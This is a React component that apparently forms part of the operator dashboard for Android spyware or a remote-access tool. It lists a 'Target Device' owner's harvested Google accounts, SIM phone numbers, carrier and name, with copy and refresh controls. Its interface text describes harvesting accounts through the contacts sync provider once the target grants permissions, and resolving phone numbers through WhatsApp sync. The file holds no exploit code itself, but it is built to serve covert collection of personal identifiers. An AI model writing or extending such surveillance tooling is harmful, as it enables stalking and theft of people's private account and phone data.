"use client";

import React, { useState } from 'react';
import { 
    Mail, Phone, User, Copy, Check, RefreshCw, Smartphone, 
    ShieldCheck, Hash, AtSign, Radio, AlertCircle, Info, ExternalLink,
    CheckCircle2
} from 'lucide-react';

interface AccountsViewProps {
    device: any;
    onRefresh: () => void;
    isLoading?: boolean;
}

export default function AccountsView({ device, onRefresh, isLoading }: AccountsViewProps) {
    const [localRefreshing, setLocalRefreshing] = useState(false);
    const [copiedKey, setCopiedKey] = useState<string | null>(null);

    const isBusy = isLoading || localRefreshing;
    const isOnline = Boolean(device?.online);

    const handleCopy = (text: string, key: string) => {
        if (!text) return;
        navigator.clipboard.writeText(text);
        setCopiedKey(key);
        setTimeout(() => setCopiedKey(null), 2000);
    };

    const handleRefresh = () => {
        if (!isOnline || isBusy) return;
        setLocalRefreshing(true);
        onRefresh();
        setTimeout(() => setLocalRefreshing(false), 2000);
    };

    const gmails: string[] = device?.gmails && Array.isArray(device.gmails) && device.gmails.length > 0
        ? device.gmails
        : (device?.gmail ? [device.gmail] : []);

    const phoneNumbers: string[] = device?.phoneNumbers && Array.isArray(device.phoneNumbers) && device.phoneNumbers.length > 0
        ? device.phoneNumbers
        : (device?.phoneNumber ? [device.phoneNumber] : []);

    const carrier = device?.carrier || '';
    const ownerName = device?.ownerName || device?.name || 'Device Owner';

    return (
        <div className="w-full max-w-7xl mx-auto px-3 sm:px-6 py-4 space-y-6 pb-20">
            <header className="rounded-2xl border border-white/[0.07] bg-[#0c121e]/90 p-4 sm:p-6 backdrop-blur-md">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div className="flex items-center gap-3.5 min-w-0">
                        <div className="w-12 h-12 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-center justify-center text-rose-400 shrink-0">
                            <Mail className="w-6 h-6" />
                        </div>
                        <div className="min-w-0">
                            <div className="flex items-center gap-2.5 flex-wrap">
                                <h1 className="text-lg sm:text-xl font-bold tracking-tight text-white truncate">
                                    Identity & Account Intelligence
                                </h1>
                                <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium tracking-wide border ${
                                    isOnline 
                                        ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' 
                                        : 'bg-rose-500/10 text-rose-400 border-rose-500/20'
                                }`}>
                                    <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`} />
                                    {isOnline ? 'ONLINE' : 'OFFLINE'}
                                </span>
                            </div>
                            <p className="text-xs text-white/50 truncate mt-0.5">
                                {device?.name || 'Target Device'} • Authenticated Google Accounts, SIM Lines & Owner Profile
                            </p>
                        </div>
                    </div>

                    <div className="flex items-center gap-2.5 shrink-0 self-start md:self-auto">
                        <button
                            onClick={handleRefresh}
                            disabled={!isOnline || isBusy}
                            className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-semibold text-xs tracking-wide transition-all border ${
                                !isOnline 
                                    ? 'bg-white/[0.02] border-white/5 text-white/30 cursor-not-allowed'
                                    : 'bg-rose-500/15 border-rose-500/30 text-rose-300 hover:bg-rose-500/25 active:scale-[0.98]'
                            }`}
                        >
                            <RefreshCw className={`w-3.5 h-3.5 ${isBusy ? 'animate-spin' : ''}`} />
                            <span>{isBusy ? 'Synchronizing...' : 'Refresh Accounts'}</span>
                        </button>
                    </div>
                </div>

                {!isOnline && (
                    <div className="mt-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 flex items-center gap-3 text-xs text-rose-300">
                        <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                        <span>Target device is currently offline. Showing cached account identities from last connection.</span>
                    </div>
                )}
            </header>

            <section className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
                    <div className="flex items-center justify-between text-white/40 text-xs">
                        <span>Google Accounts</span>
                        <AtSign className="w-4 h-4 text-rose-400" />
                    </div>
                    <div className="flex items-baseline gap-1.5">
                        <span className="font-mono text-xl sm:text-2xl font-bold text-white tabular-nums">
                            {gmails.length}
                        </span>
                        <span className="text-xs text-white/40">Synced</span>
                    </div>
                    <p className="text-[11px] text-white/40 truncate">
                        {gmails[0] || 'No accounts yet'}
                    </p>
                </div>

                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
                    <div className="flex items-center justify-between text-white/40 text-xs">
                        <span>SIM & Phone Lines</span>
                        <Phone className="w-4 h-4 text-emerald-400" />
                    </div>
                    <div className="flex items-baseline gap-1.5">
                        <span className="font-mono text-xl sm:text-2xl font-bold text-white tabular-nums">
                            {phoneNumbers.length}
                        </span>
                        <span className="text-xs text-white/40">Detected</span>
                    </div>
                    <p className="text-[11px] text-white/40 truncate">
                        {phoneNumbers[0] || (carrier ? `Carrier: ${carrier}` : 'Awaiting sync')}
                    </p>
                </div>

                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
                    <div className="flex items-center justify-between text-white/40 text-xs">
                        <span>Network Provider</span>
                        <Radio className="w-4 h-4 text-cyan-400" />
                    </div>
                    <div className="flex items-baseline gap-1.5">
                        <span className="text-base sm:text-lg font-bold text-white truncate">
                            {carrier || (isOnline ? 'Active Network' : 'Disconnected')}
                        </span>
                    </div>
                    <p className="text-[11px] text-white/40 truncate">
                        {carrier ? 'SIM Telemetry' : 'Carrier network'}
                    </p>
                </div>

                <div className="p-4 rounded-xl border border-white/[0.06] bg-[#0c121e]/60 space-y-1.5">
                    <div className="flex items-center justify-between text-white/40 text-xs">
                        <span>Device Owner</span>
                        <User className="w-4 h-4 text-indigo-400" />
                    </div>
                    <div className="flex items-baseline gap-1.5">
                        <span className="text-base sm:text-lg font-bold text-white truncate">
                            {ownerName}
                        </span>
                    </div>
                    <p className="text-[11px] text-white/40 truncate">
                        Verified Device Identity
                    </p>
                </div>
            </section>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
                <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-4">
                    <div className="flex items-center justify-between pb-3 border-b border-white/[0.05]">
                        <div className="flex items-center gap-2 text-rose-400">
                            <AtSign className="w-4 h-4" />
                            <h2 className="text-xs font-bold tracking-wider uppercase text-white">Google Accounts (Gmail)</h2>
                        </div>
                        <span className="px-2 py-0.5 rounded-full text-[11px] font-mono bg-rose-500/10 text-rose-400 border border-rose-500/20">
                            {gmails.length} Recorded
                        </span>
                    </div>

                    <div className="space-y-2.5">
                        {gmails.length > 0 ? (
                            gmails.map((email: string, idx: number) => (
                                <div 
                                    key={idx} 
                                    className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.04] bg-white/[0.02] hover:bg-white/[0.04] transition-colors"
                                >
                                    <div className="flex items-center gap-3 min-w-0 mr-2">
                                        <div className="w-9 h-9 rounded-lg bg-rose-500/15 border border-rose-500/20 flex items-center justify-center text-rose-400 font-bold text-xs shrink-0">
                                            {email[0]?.toUpperCase() || 'G'}
                                        </div>
                                        <div className="min-w-0">
                                            <p className="font-mono text-xs sm:text-sm font-semibold text-white truncate">
                                                {email}
                                            </p>
                                            <p className="text-[10px] text-white/40 mt-0.5">
                                                {idx === 0 ? 'Primary Google Account' : 'Secondary Sync Account'}
                                            </p>
                                        </div>
                                    </div>

                                    <button
                                        onClick={() => handleCopy(email, `email_${idx}`)}
                                        className="p-2 sm:px-3 sm:py-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] hover:bg-white/[0.08] text-white/70 hover:text-white transition-all shrink-0 flex items-center gap-1.5 text-xs active:scale-95"
                                        title="Copy Email"
                                    >
                                        {copiedKey === `email_${idx}` ? (
                                            <>
                                                <Check className="w-3.5 h-3.5 text-emerald-400" />
                                                <span className="hidden sm:inline text-emerald-400 text-[11px] font-medium">Copied</span>
                                            </>
                                        ) : (
                                            <>
                                                <Copy className="w-3.5 h-3.5" />
                                                <span className="hidden sm:inline text-[11px]">Copy</span>
                                            </>
                                        )}
                                    </button>
                                </div>
                            ))
                        ) : (
                            <div className="py-10 px-4 rounded-xl border border-white/[0.03] bg-white/[0.01] text-center space-y-2">
                                <Mail className="w-8 h-8 text-white/20 mx-auto" />
                                <h3 className="text-xs font-semibold text-white/80">No Google Accounts Synchronized</h3>
                                <p className="text-[11px] text-white/40 max-w-sm mx-auto">
                                    Accounts are harvested via contacts sync provider. Ensure target has active Google account signed in and contacts permission is authorized.
                                </p>
                            </div>
                        )}
                    </div>
                </section>

                <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-4">
                    <div className="flex items-center justify-between pb-3 border-b border-white/[0.05]">
                        <div className="flex items-center gap-2 text-emerald-400">
                            <Phone className="w-4 h-4" />
                            <h2 className="text-xs font-bold tracking-wider uppercase text-white">SIM & Mobile Numbers</h2>
                        </div>
                        <div className="flex items-center gap-2">
                            {carrier && (
                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-mono bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">
                                    <Radio className="w-2.5 h-2.5 text-emerald-400" /> {carrier}
                                </span>
                            )}
                            <span className="px-2 py-0.5 rounded-full text-[11px] font-mono bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                                {phoneNumbers.length} Detected
                            </span>
                        </div>
                    </div>

                    <div className="space-y-2.5">
                        {phoneNumbers.length > 0 ? (
                            phoneNumbers.map((num: string, idx: number) => (
                                <div 
                                    key={idx} 
                                    className="flex items-center justify-between p-3.5 rounded-xl border border-white/[0.04] bg-white/[0.02] hover:bg-white/[0.04] transition-colors"
                                >
                                    <div className="flex items-center gap-3 min-w-0 mr-2">
                                        <div className="w-9 h-9 rounded-lg bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center text-emerald-400 font-bold text-xs shrink-0">
                                            #{idx + 1}
                                        </div>
                                        <div className="min-w-0">
                                            <p className="font-mono text-xs sm:text-sm font-bold text-emerald-300 truncate">
                                                {num}
                                            </p>
                                            <p className="text-[10px] text-white/40 mt-0.5">
                                                {carrier ? `Mobile Line • ${carrier}` : 'Verified Mobile Identity'}
                                            </p>
                                        </div>
                                    </div>

                                    <button
                                        onClick={() => handleCopy(num, `phone_${idx}`)}
                                        className="p-2 sm:px-3 sm:py-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] hover:bg-white/[0.08] text-white/70 hover:text-white transition-all shrink-0 flex items-center gap-1.5 text-xs active:scale-95"
                                        title="Copy Phone Number"
                                    >
                                        {copiedKey === `phone_${idx}` ? (
                                            <>
                                                <Check className="w-3.5 h-3.5 text-emerald-400" />
                                                <span className="hidden sm:inline text-emerald-400 text-[11px] font-medium">Copied</span>
                                            </>
                                        ) : (
                                            <>
                                                <Copy className="w-3.5 h-3.5" />
                                                <span className="hidden sm:inline text-[11px]">Copy</span>
                                            </>
                                        )}
                                    </button>
                                </div>
                            ))
                        ) : (
                            <div className="py-10 px-4 rounded-xl border border-white/[0.03] bg-white/[0.01] text-center space-y-2">
                                <Phone className="w-8 h-8 text-white/20 mx-auto" />
                                <h3 className="text-xs font-semibold text-white/80">No SIM Phone Number Recorded</h3>
                                <p className="text-[11px] text-white/40 max-w-sm mx-auto">
                                    {carrier 
                                        ? `Carrier ${carrier} active. Most SIM cards do not write the MSISDN directly to the SIM card. Active WhatsApp or messaging sync will resolve the line number.` 
                                        : 'Awaiting SIM registration or messaging account sync.'}
                                </p>
                            </div>
                        )}
                    </div>
                </section>
            </div>

            <section className="p-5 sm:p-6 rounded-2xl border border-white/[0.06] bg-[#0c121e]/60 space-y-3">
                <div className="flex items-center gap-2 text-indigo-400 pb-2 border-b border-white/[0.05]">
                    <User className="w-4 h-4" />
                    <h2 className="text-xs font-bold tracking-wider uppercase text-white">Device Owner Profile & Provenance</h2>
                </div>
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-xl border border-white/[0.04] bg-white/[0.02]">
                    <div className="space-y-0.5">
                        <span className="text-[11px] text-white/40 uppercase tracking-wider font-semibold">Registered Host Display Name</span>
                        <p className="text-base sm:text-lg font-bold text-white tracking-tight">{ownerName}</p>
                    </div>
                    <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-emerald-500/20 bg-emerald-500/10 text-emerald-400 text-xs font-medium self-start sm:self-auto">
                        <ShieldCheck className="w-4 h-4" />
                        <span>Verified Account Profile</span>
                    </div>
                </div>
            </section>
        </div>
    );
}
